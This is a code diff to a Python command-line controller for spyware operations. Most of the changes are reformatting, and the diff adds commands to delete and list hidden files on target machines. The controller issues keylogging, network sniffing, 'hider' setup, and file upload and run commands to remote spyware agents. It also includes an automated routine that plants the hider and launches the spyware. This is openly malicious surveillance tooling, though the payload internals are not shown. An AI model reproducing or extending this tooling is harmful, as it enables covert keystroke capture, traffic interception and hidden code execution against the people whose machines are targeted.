@@ -16,6 +16,7 @@ $ setup <hiderPathTarget> <imagePath> <mountPath>
 $ sniff 30
 """
 
+
 def LOG(s: str):
     print(f"LOG: {s}")
 
@@ -74,18 +75,18 @@ def call_method(obj, method: str, *args):
 def print_methods(obj):
     attributes = dir(obj)
     methods = [
-        attr
-        for attr in attributes
-        if callable(getattr(obj, attr)) and not "__" in attr
+        attr for attr in attributes if callable(getattr(obj, attr)) and not "__" in attr
     ]
     print("YAY: Available Methods: (q for exit)")
-    print(*methods, sep=' * ')
+    print(*methods, sep=" * ")
+
 
 def search_op(oper_dict: dict[str, Operation], name: str):
     for ip, op in oper_dict.items():
         if op.name == name:
             return op
     return None
+
 
 class UI:
     def __init__(self, operations: dict[str, Operation]) -> None:
@@ -117,7 +118,7 @@ class UI:
 
     def spyware(self, method, *args):
         """
-        USAGE: spyware <method> <arg1> ... <argn> 
+        USAGE: spyware <method> <arg1> ... <argn>
         Make spyware of selected operation perform action and print result
         Returns: result of action
         """
@@ -128,7 +129,7 @@ class UI:
 
     def manager(self, method, *args):
         """
-        USAGE: manager <method> <arg1> ... <argn> 
+        USAGE: manager <method> <arg1> ... <argn>
         Make manager of selected operation perform action and print result
         Returns: result of action
         """
@@ -142,7 +143,10 @@ class UI:
         USAGE: ops
         Print list of active operations.
         """
-        weird_dict = [{'IP': ip, 'Name': op.name, 'Selected': op == self.ctx.selected_operation} for ip, op in self.ctx.oper_dict.items()]
+        weird_dict = [
+            {"IP": ip, "Name": op.name, "Selected": op == self.ctx.selected_operation}
+            for ip, op in self.ctx.oper_dict.items()
+        ]
         print(tabulate.tabulate(weird_dict, headers="keys", tablefmt="simple"))
 
     def rename(self, old_name, new_name):
@@ -153,11 +157,11 @@ class UI:
         if not op:
             print("OOPSIE: Operation not found")
             return
-        
+
         if not search_op(self.ctx.oper_dict, new_name) == None:
             print("OOPSIE: new name exists")
             return
-        
+
         op.name = new_name
 
     def agenthelp(self):
@@ -167,12 +171,12 @@ class UI:
         """
         print_methods(Agent(0))
 
-    def help(self, method=''):
+    def help(self, method=""):
         """
         USAGE: help <method>
         USAGE: help
 
-        Print help information. 
+        Print help information.
         - if received method prints doc of method
         - if not prints list of methods
 
@@ -244,10 +248,10 @@ class UI:
         USAGE: sniff <time>
         Performs sniffing on spyware
         Tries to find a net if it was not set.
-        
+
         @pre:
         hider was setup in spyware
-        
+
         Args:
             time - how many seconds to sniff
         """
@@ -271,17 +275,17 @@ class UI:
         """
         USAGE: kligger <time>
         Performs keylogging on spyware
-        
+
         @pre:
         hider was setup in spyware
-        
+
         Args:
             time - how many seconds to track
         """
         time = int(time)
         if not self.is_op_active():
             return
-        self.setup('sentHider.o', 'f', 'f')
+        self.setup("sentHider.o", "f", "f")
         kligPar = Params()
         kligPar.kligP = kligPrams(time)
         ic(kligPar)
@@ -298,23 +302,23 @@ class UI:
         """
         USAGE: setup <targetPath> <imagePath> <mountPath>
         Set hider path and other params in manager and spyware (if exists)
-        
+
         Args:
             targetPath - path of hider. needs to already be in machine
             imagePath, mountPath - params for hiding
         """
         if not self.is_op_active():
             return
-        print(self.ctx.selected_operation.managerAgent.hider_setup(
-            targetPath, imagePath, mountPath
-        ))
+        print(
+            self.ctx.selected_operation.managerAgent.hider_setup(
+                targetPath, imagePath, mountPath
+            )
+        )
         LOG(f"Manager hider set")
         spy = self.ctx.selected_operation.spyAgent
         if not spy:
             return
-        print(spy.hider_setup(
-            targetPath, imagePath, mountPath
-        ))
+        print(spy.hider_setup(targetPath, imagePath, mountPath))
         LOG(f"Spyware hider set")
 
     def check_ready(self):
@@ -328,12 +332,12 @@ class UI:
     def run(self, targetPath):
         """
         USAGE: run <targetPath>
-        Run a file in target machine
-        
+        Run a hidden file in target machine
+
         Args:
             targetPath - path of file. Needs to already be in target machine
         Returns:
-            result of the startup
+            Status
         """
         if self.check_ready():
             res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
@@ -342,11 +346,45 @@ class UI:
             )
             print(res)
 
+    def delete(self, targetPath):
+        """
+        USAGE: delete <targetPath>
+        Delete a hidden file in target machine
+
+        Args:
+            targetPath - path of file. Needs to already be in target machine
+        Returns:
+            Status
+        """
+        if self.check_ready():
+            res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
+                FunCode.HIDDEN_DELETE,
+                targetPath,
+            )
+            print(res)
+
+    def list_hidden(self):
+        """
+        USAGE:
+        list hidden files in target machine
+
+        Args:
+            targetPath - path of file. Needs to already be in target machine
+        Returns:
+            Status
+        """
+        if self.check_ready():
+            res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
+                FunCode.HIDDEN_LIST,
+                "",
+            )
+            print(res)
+
     def uprun(self, homePath, targetPath):
         """
         USAGE: uprun <homePath> <targetPath>
         Upload and run a file in target machine
-        
+
         Args:
             homePath - path on home machine
             targetPath - path to save on target. Overwriting if exists
@@ -366,7 +404,7 @@ class UI:
         USAGE: upload <homePath> <targetPath>
         Upload a file to target machine.
         Does not run file
-        
+
         Args:
             homePath - path on home machine
             targetPath - path to save on target. Overwriting if exists
@@ -374,27 +412,29 @@ class UI:
             result of the upload
         """
         if self.check_ready():
-            print(self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
-                FunCode.HIDDEN_UPLOAD,
-                homePath,
-                targetPath,
-            ))
+            print(
+                self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
+                    FunCode.HIDDEN_UPLOAD,
+                    homePath,
+                    targetPath,
+                )
+            )
 
     def lazy(self):
         """
         Automatic steps up to spyware run
         """
-        ip = '127.0.0.1'
-        hiderHome = 'hider'
-        hiderTarg = 'sentHider.o'
-        spyHome = 'spyware'
+        ip = "127.0.0.1"
+        hiderHome = "hider"
+        hiderTarg = "sentHider.o"
+        spyHome = "spyware"
         spyTarget = "sentSpyware" + str(randint(1, 1000)) + ".spy"
         self.select(ip)
-        self.manager('write_file', hiderHome, hiderTarg)
-        self.setup(hiderTarg, 'f', 'f')
+        self.manager("write_file", hiderHome, hiderTarg)
+        self.setup(hiderTarg, "f", "f")
         self.uprun(spyHome, spyTarget)
-        self.setup(hiderTarg, 'f', 'f')
-        print('Done. Your turn.')
+        self.setup(hiderTarg, "f", "f")
+        print("Done. Your turn.")
 
     def list_ops_names(self):
         for op in self.ctx.oper_dict.values():
